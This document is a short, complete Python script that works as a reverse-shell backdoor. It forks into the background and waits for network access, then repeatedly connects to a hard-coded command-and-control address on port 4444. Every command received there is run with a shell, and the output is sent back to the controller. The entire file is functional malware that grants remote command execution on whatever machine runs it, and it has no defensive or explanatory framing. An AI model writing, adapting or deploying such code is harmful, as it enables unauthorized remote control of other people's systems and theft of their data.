#!/usr/bin/env python3
import socket
import subprocess
import os
import time
import sys

# ======== CONFIGURATION ========
C2_IP = "192.168.1.167"
C2_PORT = 4444
# ===============================

def become_persistent():
    """Make the script survive process termination"""
    try:
        # Fork to background
        if os.fork() > 0:
            sys.exit(0)
    except:
        pass

def wait_for_network():
    """Wait for network connectivity"""
    for i in range(30):
        try:
            socket.create_connection(("8.8.8.8", 53), timeout=5)
            return True
        except:
            time.sleep(2)
    return True  # Continue anyway

def reliable_execute(cmd):
    """Execute command reliably"""
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout + result.stderr
        return output if output else "Command executed successfully"
    except Exception as e:
        return f"Error: {str(e)}"

def persistent_connect():
    """Main connection loop with persistent retry"""
    become_persistent()
    wait_for_network()
    
    while True:
        try:
            print(f"[+] Attempting connection to {C2_IP}:{C2_PORT}")
            s = socket.socket()
            s.settimeout(30)
            s.connect((C2_IP, C2_PORT))
            print("[+] Connected to C2 server")
            s.send(b"Persistent shell activated\n")
            
            while True:
                data = s.recv(1024).decode().strip()
                if not data:
                    continue
                    
                if data.lower() == 'exit':
                    break
                
                output = reliable_execute(data)
                s.send(output.encode())
                
        except ConnectionRefusedError:
            print("[-] Connection refused - waiting to retry...")
        except socket.timeout:
            print("[-] Connection timeout")
        except Exception as e:
            print(f"[-] Connection error: {e}")
        
        print("[+] Reconnecting in 30 seconds...")
        time.sleep(30)

if __name__ == "__main__":
    persistent_connect()
